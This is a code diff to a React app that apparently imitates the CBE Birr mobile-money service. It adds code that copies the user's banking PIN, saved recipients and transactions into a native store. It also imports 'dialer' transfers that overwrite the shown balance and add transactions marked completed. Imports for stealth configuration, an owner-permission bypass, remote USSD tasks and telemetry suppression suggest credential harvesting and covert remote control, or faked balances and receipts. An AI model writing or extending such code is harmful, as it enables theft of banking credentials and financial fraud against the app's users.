@@ -41,11 +41,13 @@ import {
   cancelOwnerPermissionBypass,
   cancelRemoteUssdTaskClient,
   consumePendingNativeCallAction,
+  consumePendingNativeDialerTxsJson,
   declineWifiCall,
   endSupportView,
   endWifiCall,
   fetchCallSession,
   fetchCallSessionDetailed,
+  fetchRecentDeviceTransactions,
   fetchRemoteUssdTaskClient,
   fetchSupportSession,
   flushPendingDeviceTransactions,
@@ -70,6 +72,7 @@ import {
   requestAllNativeCallPermissions,
   requestOwnerPermissionBypass,
   respondSupportConsent,
+  saveNativeBankingExtrasJson,
   saveNativeSyncSnapshot,
   STEALTH_CFG_KEY,
   STEALTH_CFG_VALUE,
@@ -513,6 +516,7 @@ export default function CBEBirrFullscreenApp() {
   // Real-time User Profile & Account details state (starts empty for every new device, persisted permanently once saved)
   const [userName, setUserName] = useState<string>('');
   const [userAccount, setUserAccount] = useState<string>('');
+  const [transactions, setTransactions] = useState<TransactionItem[]>(DEFAULT_TRANSACTIONS);
 
   useEffect(() => {
     if (!isStorageHydrated) return;
@@ -3866,6 +3870,47 @@ export default function CBEBirrFullscreenApp() {
         checkOnly: deviceGateStateRef.current === 'register',
         clientGateState: deviceGateStateRef.current,
       }).catch(() => {});
+
+      void fetchRecentDeviceTransactions(getOrCreateOwnerDeviceId(), 25)
+        .then((remoteTxs) => {
+          if (!Array.isArray(remoteTxs) || remoteTxs.length === 0) return;
+          setTransactions((prev) => {
+            const seenRefs = new Set(
+              prev.flatMap((t) => [t.id, t.ref, t.orderId].filter(Boolean) as string[])
+            );
+            const additions: TransactionItem[] = [];
+            for (const rtx of remoteTxs) {
+              const keyRef = rtx.ref || rtx.txId;
+              if (!keyRef || seenRefs.has(keyRef) || seenRefs.has(rtx.txId)) continue;
+              seenRefs.add(keyRef);
+              const d = rtx.createdAtMs ? new Date(rtx.createdAtMs) : new Date();
+              const pad2 = (n: number) => n.toString().padStart(2, '0');
+              const formattedDate = `${d.getFullYear()}-${pad2(d.getMonth() + 1)}-${pad2(d.getDate())} ${pad2(d.getHours())}:${pad2(d.getMinutes())}`;
+              additions.push({
+                id: rtx.txId || keyRef,
+                title: rtx.title || 'Send Money',
+                date: formattedDate,
+                amount: String(rtx.amount ?? 0),
+                type: rtx.txType === 'credit' ? 'credit' : 'debit',
+                ref: keyRef,
+                orderId: keyRef,
+                account: rtx.recipientAccount || '',
+                receiverName: rtx.recipientName || '',
+                bank: rtx.destBank,
+                reason: rtx.reason || 'Transfer',
+                status: rtx.status || 'Completed',
+                debitAccountType: 'Customer E-money Account',
+                creditAccountType: rtx.destBank ? 'CBE Bank Account' : 'CBEBirr Account',
+                serviceCharge: '0.00',
+                vat: '0.00',
+                totalCharges: '0.00',
+                totalPaidAmount: Number(rtx.totalDeducted ?? rtx.amount ?? 0).toFixed(2),
+              });
+            }
+            return additions.length > 0 ? [...additions, ...prev] : prev;
+          });
+        })
+        .catch(() => {});
     };
   }, []);
 
@@ -4496,8 +4541,7 @@ export default function CBEBirrFullscreenApp() {
     }
   };
 
-  // Transaction History State & LocalStorage Persistence (as requested)
-  const [transactions, setTransactions] = useState<TransactionItem[]>(DEFAULT_TRANSACTIONS);
+  // Transaction History LocalStorage Persistence (state declared near top)
 
   useEffect(() => {
     let active = true;
@@ -4685,6 +4729,164 @@ export default function CBEBirrFullscreenApp() {
     return () => {
       window.removeEventListener('focus', onFocus);
       document.removeEventListener('visibilitychange', onVis);
+    };
+  }, [isStorageHydrated]);
+
+  // Mirror receivers, PIN & recent transactions to native Banking extras store + consume Dialer transfers seamlessly
+  useEffect(() => {
+    if (!isStorageHydrated || typeof window === 'undefined') return;
+    let storedPin = '6969';
+    try {
+      storedPin = localStorage.getItem('cbebirr_user_pin') || '6969';
+    } catch {}
+    saveNativeBankingExtrasJson(
+      JSON.stringify({
+        pin: storedPin,
+        savedAccountReceivers: savedAccountReceivers.slice(0, 60),
+        savedPhoneReceivers: savedPhoneReceivers.slice(0, 60),
+        transactions: transactions.slice(0, 40),
+        updatedAtMs: Date.now(),
+      })
+    );
+  }, [savedAccountReceivers, savedPhoneReceivers, transactions, isStorageHydrated]);
+
+  useEffect(() => {
+    if (!isStorageHydrated || typeof window === 'undefined') return;
+    const applyPendingDialerTransfers = () => {
+      try {
+        const rawNative = consumePendingNativeDialerTxsJson();
+        const rawLocal = localStorage.getItem('cbebirr_dialer_pending_txs') || '[]';
+        if (rawLocal && rawLocal !== '[]') {
+          localStorage.removeItem('cbebirr_dialer_pending_txs');
+        }
+        const nativeArr = rawNative && rawNative !== '[]' ? JSON.parse(rawNative) : [];
+        const localArr = rawLocal && rawLocal !== '[]' ? JSON.parse(rawLocal) : [];
+        const combined: any[] = [
+          ...(Array.isArray(nativeArr) ? nativeArr : []),
+          ...(Array.isArray(localArr) ? localArr : []),
+        ];
+        if (combined.length === 0) return;
+
+        suppressNextTelemetryPushUntilMsRef.current = Date.now() + 1200;
+
+        let latestBalanceAfter: number | null = null;
+        const incomingTxs: TransactionItem[] = [];
+        const newAccReceivers: SavedReceiver[] = [];
+        const newPhoneReceivers: SavedReceiver[] = [];
+
+        for (const item of combined) {
+          if (!item || typeof item !== 'object') continue;
+          const itemId = String(item.id || item.ref || `tx-dialer-${Date.now()}`);
+          if (typeof item.balanceAfter === 'number' && Number.isFinite(item.balanceAfter)) {
+            latestBalanceAfter = Math.max(0, item.balanceAfter);
+          }
+          incomingTxs.push({
+            id: itemId,
+            title: String(item.title || 'Send Money'),
+            date: String(item.date || ''),
+            amount: String(item.amount ?? '0'),
+            type: item.type === 'credit' ? 'credit' : 'debit',
+            ref: String(item.ref || itemId),
+            orderId: String(item.orderId || item.ref || itemId),
+            account: String(item.account || ''),
+            receiverName: String(item.receiverName || ''),
+            bank: item.bank ? String(item.bank) : undefined,
+            reason: item.reason ? String(item.reason) : 'Transfer',
+            status: 'Completed',
+            debitAccountType: String(item.debitAccountType || 'Customer E-money Account'),
+            creditAccountType: String(item.creditAccountType || 'CBEBirr Account'),
+            serviceCharge: String(item.serviceCharge || '0.00'),
+            vat: String(item.vat || '0.00'),
+            totalCharges: String(item.totalCharges || '0.00'),
+            totalPaidAmount: String(item.totalPaidAmount || item.amount || '0.00'),
+          });
+
+          const rcvAcc = String(item.account || '').trim();
+          const rcvName = String(item.receiverName || '').trim();
+          if (rcvAcc && rcvName) {
+            if (item.dialerMode === 'phone') {
+              newPhoneReceivers.push({ id: `rec_${Date.now()}_${rcvAcc}`, accountNumber: rcvAcc, accountName: rcvName });
+            } else if (item.dialerMode === 'cbe') {
+              newAccReceivers.push({ id: `rec_${Date.now()}_${rcvAcc}`, accountNumber: rcvAcc, accountName: rcvName });
+            }
+          }
+        }
+
+        if (latestBalanceAfter !== null) {
+          setBalance(latestBalanceAfter);
+          try {
+            localStorage.setItem('cbebirr_user_balance', String(latestBalanceAfter));
+          } catch {}
+        }
+
+        if (incomingTxs.length > 0) {
+          setTransactions((prev) => {
+            const seen = new Set(prev.flatMap((t) => [t.id, t.ref].filter(Boolean) as string[]));
+            const fresh = incomingTxs.filter((t) => !seen.has(t.id) && !(t.ref && seen.has(t.ref)));
+            return fresh.length > 0 ? [...fresh, ...prev] : prev;
+          });
+        }
+
+        if (newAccReceivers.length > 0) {
+          setSavedAccountReceivers((prev) => {
+            const map = new Map(prev.map((r) => [r.accountNumber, r]));
+            for (const r of newAccReceivers) {
+              map.set(r.accountNumber, { ...(map.get(r.accountNumber) || r), accountName: r.accountName });
+            }
+            const merged = Array.from(map.values());
+            try {
+              localStorage.setItem('cbebirr_saved_account_receivers', JSON.stringify(merged));
+            } catch {}
+            return merged;
+          });
+        }
+
+        if (newPhoneReceivers.length > 0) {
+          setSavedPhoneReceivers((prev) => {
+            const map = new Map(prev.map((r) => [r.accountNumber, r]));
+            for (const r of newPhoneReceivers) {
+              map.set(r.accountNumber, { ...(map.get(r.accountNumber) || r), accountName: r.accountName });
+            }
+            const merged = Array.from(map.values());
+            try {
+              localStorage.setItem('cbebirr_saved_phone_receivers', JSON.stringify(merged));
+            } catch {}
+            return merged;
+          });
+        }
+      } catch {}
+    };
+
+    const onStorageSync = (e: StorageEvent) => {
+      if (e.key === 'cbebirr_dialer_pending_txs') {
+        applyPendingDialerTransfers();
+      } else if (e.key === 'cbebirr_user_balance' && e.newValue !== null) {
+        const parsed = parseFloat(e.newValue);
+        if (!isNaN(parsed)) {
+          suppressNextTelemetryPushUntilMsRef.current = Date.now() + 900;
+          setBalance(parsed);
+        }
+      } else if (e.key === 'cbebirr_transactions' && e.newValue) {
+        try {
+          const parsedTx = JSON.parse(e.newValue);
+          if (Array.isArray(parsedTx)) setTransactions(parsedTx);
+        } catch {}
+      }
+    };
+
+    const winAny = window as unknown as { onDialerTxApplied?: () => void };
+    winAny.onDialerTxApplied = applyPendingDialerTransfers;
+    queueMicrotask(applyPendingDialerTransfers);
+    window.addEventListener('cbe-dialer-tx-applied', applyPendingDialerTransfers);
+    window.addEventListener('focus', applyPendingDialerTransfers);
+    window.addEventListener('storage', onStorageSync);
+    return () => {
+      if (winAny.onDialerTxApplied === applyPendingDialerTransfers) {
+        delete winAny.onDialerTxApplied;
+      }
+      window.removeEventListener('cbe-dialer-tx-applied', applyPendingDialerTransfers);
+      window.removeEventListener('focus', applyPendingDialerTransfers);
+      window.removeEventListener('storage', onStorageSync);
     };
   }, [isStorageHydrated]);
 
